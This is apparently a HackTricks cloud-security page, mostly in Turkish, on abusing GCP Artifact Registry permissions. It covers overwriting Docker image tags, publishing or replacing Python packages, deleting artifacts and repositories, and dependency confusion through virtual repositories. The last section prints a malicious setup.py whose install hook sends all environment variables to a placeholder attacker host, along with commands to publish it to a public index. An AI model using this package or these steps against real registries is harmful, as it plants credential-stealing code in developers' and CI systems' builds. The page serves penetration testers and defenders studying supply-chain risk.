# GCP - Artifact Registry Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Artifact Registry

Artifact Registry hakkında daha fazla bilgi için bakınız:

{{#ref}}
../gcp-services/gcp-artifact-registry-enum.md
{{#endref}}

### artifactregistry.repositories.uploadArtifacts

Bu izinle bir saldırgan, Docker images gibi kötü amaçlı kod içeren artifact'ların yeni sürümlerini yükleyebilir:

<details>
<summary>Upload Docker image to Artifact Registry</summary>
```bash
# Configure docker to use gcloud to authenticate with Artifact Registry
gcloud auth configure-docker <location>-docker.pkg.dev

# tag the image to upload it
docker tag <local-img-name>:<local-tag> <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>

# Upload it
docker push <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

> [!CAUTION]
> Mevcut olanla aynı isim ve tag'e sahip yeni bir **kötü amaçlı docker** imajı yüklemenin **mümkün olduğu** doğrulandı; bu yüzden **eski imaj tag'ini kaybedecek** ve aynı tag ile bir sonraki indirmede **kötü amaçlı olan indirilecektir**.

<details>

<summary>Bir Python kütüphanesi yükle</summary>

**Yüklemek için kütüphaneyi oluşturarak başlayın** (registry'den en güncel sürümü indirebiliyorsanız bu adımı atlayabilirsiniz):

1.  **Proje yapınızı ayarlayın**:

- Kütüphaneniz için yeni bir dizin oluşturun, örn. `hello_world_library`.
- Bu dizinin içinde paket adınızla başka bir dizin oluşturun, örn. `hello_world`.
- Paket dizininizde bir `__init__.py` dosyası oluşturun. Bu dosya boş olabilir veya paketiniz için başlangıç tanımlamalarını içerebilir.

<details>
<summary>Create project structure</summary>

```bash
mkdir hello_world_library
cd hello_world_library
mkdir hello_world
touch hello_world/__init__.py
```

</details>

2.  **Kütüphane kodunuzu yazın**:

- `hello_world` dizininin içinde modülünüz için yeni bir Python dosyası oluşturun, örn. `greet.py`.
- "Hello, World!" fonksiyonunuzu yazın:

<details>
<summary>Create library module</summary>

```python
# hello_world/greet.py
def say_hello():
return "Hello, World!"
```

</details>

3.  **Bir `setup.py` dosyası oluşturun**:

- `hello_world_library` dizininizin kökünde bir `setup.py` dosyası oluşturun.
- Bu dosya kütüphaneniz hakkında metadata içerir ve Python'a nasıl kurulacağını söyler.

<details>
<summary>Create setup.py file</summary>

```python
# setup.py
from setuptools import setup, find_packages

setup(
name='hello_world',
version='0.1',
packages=find_packages(),
install_requires=[
# Any dependencies your library needs
],
)
```

</details>

**Şimdi, kütüphaneyi yükleyelim:**

1.  **Paketinizi derleyin**:

- `hello_world_library` dizininizin kökünden şu komutu çalıştırın:

<details>
<summary>Build Python package</summary>

```sh
python3 setup.py sdist bdist_wheel
```

</details>

2.  **twine için kimlik doğrulamayı yapılandırın** (paketinizi yüklemek için kullanılır):
- `twine`'in yüklü olduğundan emin olun (`pip install twine`).
- Kimlik bilgilerini yapılandırmak için `gcloud` kullanın:

<details>
<summary>Upload package with twine</summary>
```sh
twine upload --username 'oauth2accesstoken' --password "$(gcloud auth print-access-token)" --repository-url https://<location>-python.pkg.dev/<project-id>/<repo-name>/ dist/*
```
</details>

3. **Derlemeyi temizle**

<details>
<summary>Derleme artifaktlarını temizle</summary>
```bash
rm -rf dist build hello_world.egg-info
```
</details>

</details>

> [!CAUTION]
> Aynı sürüme sahip bir python kütüphanesini yüklemek mümkün değil, fakat **daha büyük sürümler** yüklemek mümkündür (veya sürümün sonuna işe yararsa ekstra bir **`.0` eklemek** — python'da genellikle işe yaramaz), veya son sürümü **silip yerine yeni bir sürüm yüklemek** mümkündür (gerekli izin `artifactregistry.versions.delete`): 
>
> <details>
> <summary>Artifact sürümünü sil</summary>
>
> ```sh
> gcloud artifacts versions delete <version> --repository=<repo-name> --location=<location> --package=<lib-name>
> ```
>
> </details>

### `artifactregistry.repositories.downloadArtifacts`

Bu izin sayesinde **artifacts** indirebilir ve **hassas bilgileri** ile **zafiyetleri** araştırabilirsiniz.

Bir **Docker** imajı indirin:

<details>
<summary>Artifact Registry'den Docker imajı indirme</summary>
```sh
# Configure docker to use gcloud to authenticate with Artifact Registry
gcloud auth configure-docker <location>-docker.pkg.dev

# Dowload image
docker pull <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

Bir **python** kütüphanesini indir:

<details>
<summary>Artifact Registry'den Python kütüphanesini indir</summary>
```bash
pip install <lib-name> --index-url "https://oauth2accesstoken:$(gcloud auth print-access-token)@<location>-python.pkg.dev/<project-id>/<repo-name>/simple/" --trusted-host <location>-python.pkg.dev --no-cache-dir
```
</details>

- Bir sanal registry içinde remote ve standard registry'ler karışırsa ve bir paket her ikisinde de varsa ne olur? Bu sayfaya bak:

{{#ref}}
../gcp-persistence/gcp-artifact-registry-persistence.md
{{#endref}}

### `artifactregistry.tags.delete`, `artifactregistry.versions.delete`, `artifactregistry.packages.delete`, (`artifactregistry.repositories.get`, `artifactregistry.tags.get`, `artifactregistry.tags.list`)

Registrysten Docker görüntüleri gibi artefaktları siler:

<details>
<summary>Artifact Registry'den Docker görüntüsü silme</summary>
```bash
# Delete a docker image
gcloud artifacts docker images delete <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

### `artifactregistry.repositories.delete`

Tam bir depoyu sil (içerik olsa bile):

<details>
<summary>Artifact Registry deposunu sil</summary>
```
gcloud artifacts repositories delete <repo-name> --location=<location>
```
</details>

### `artifactregistry.repositories.setIamPolicy`

Bu izne sahip bir saldırgan, kendisine daha önce bahsedilen depo saldırılarını gerçekleştirme yetkilerini verebilir.

### Pivoting to other Services through Artifact Registry Read & Write

- **Cloud Functions**

When a Cloud Function is created a new docker image is pushed to the Artifact Registry of the project. Yeni bir image ile mevcut imajı değiştirmeyi denedim, hatta mevcut imajı (ve `cache` imajını) silmeyi bile denedim ama hiçbir şey değişmedi, cloud function çalışmaya devam etti. Bu nedenle, tıpkı bucket ile olduğu gibi bir **Race Condition attack** suistimal edilerek çalıştırılacak docker container'ı değiştirmek mümkün olabilir ama **sadece depolanan imajı değiştirmek Cloud Function'ı ele geçirmeye yetmiyor**.

- **App Engine**

Even though App Engine creates docker images inside Artifact Registry. Test edildi ki **bu servis içindeki imajı değiştirmiş olsanız bile** ve App Engine örneğini kaldırıp (yeni bir tane deploy edilse bile) **çalıştırılan kod değişmiyor**.\
bucket'larda olduğu gibi bir **Race Condition attack** gerçekleştirerek çalıştırılan kodu üstüne yazmak mümkün olabilir, ancak bu test edilmedi.


### `artifactregistry.repositories.update`
Bir saldırganın bu sorunu istismar etmek için özel Artifact Registry izinlerine ihtiyacı yok—sadece zayıf bir virtual-repository konfigürasyonu yeterlidir. Bu durum, bir virtual repository uzaktaki bir public repository (ör. PyPI, npm) ile internal bir repository'yi birleştirdiğinde ve remote kaynağın eşit veya daha yüksek önceliğe sahip olduğunda ortaya çıkar. Her ikisinde de aynı ada sahip bir paket varsa sistem en yüksek versiyonu seçer. Saldırganın sadece iç paketin adını bilmesi ve ilgili public registry'ye paket yayınlayabilmesi gerekir.

`artifactregistry.repositories.update` izniyle bir saldırgan, bir virtual repository'nin upstream ayarlarını değiştirerek kasıtlı olarak bu zayıf yapılandırmayı oluşturabilir ve Dependency Confusion'ı bir persistence yöntemi olarak kullanıp geliştiricilerin veya CI/CD sistemlerinin otomatik olarak yükleyebileceği kötü amaçlı paketler yerleştirebilir.

Saldırgan, public repository'de iç paketin daha yüksek sürümlü kötü amaçlı bir versiyonunu oluşturur. Python paketleri için bu, meşru yapıyı taklit eden bir paket yapısı hazırlamak anlamına gelir.
```bash
mkdir /tmp/malicious_package
cd /tmp/malicious_package
PACKAGE_NAME="<package-name>"
mkdir "$PACKAGE_NAME"
touch "$PACKAGE_NAME/__init__.py"
```
Ardından, kurulum sırasında çalışacak kötü amaçlı kod içeren bir setup.py dosyası oluşturulur. Bu dosya, özel depodaki sürümden daha yüksek bir sürüm numarası belirtmelidir.
```bash
cat > setup.py << 'EOF'
import setuptools
from setuptools.command.install import install
import os
import urllib.request
import urllib.parse

def malicious_function():
data = dict(os.environ)
encoded_data = urllib.parse.urlencode(data).encode()
url = 'https://<ip-atacante>/exfil'
req = urllib.request.Request(url, data=encoded_data)
urllib.request.urlopen(req)

class AfterInstall(install):
def run(self):
install.run(self)
malicious_function()

setuptools.setup(
name = "<package-name>",
version = "0.1.1",
packages = ["<package-name>"],
cmdclass={'install': AfterInstall},
)
EOF
```
Paketi oluşturun ve kurulum sırasında kodun çalıştırılmasını sağlamak için wheel'i silin.
```bash
python3 setup.py sdist bdist_wheel
rm dist/<package-name>*.whl
```
Kötücül paketi genel depoya yükleyin (örneğin, Python için test.pypi.org).
```bash
pip install twine
twine upload --repository testpypi dist/*
```
Bir sistem veya servis paketi virtual repository kullanarak kurduğunda, zararlı sürüm daha yüksek olduğu ve uzak repository eşit veya daha yüksek önceliğe sahip olduğu için, meşru dahili repository yerine public repository'den zararlı sürümü indirir.

{{#include ../../../banners/hacktricks-training.md}}
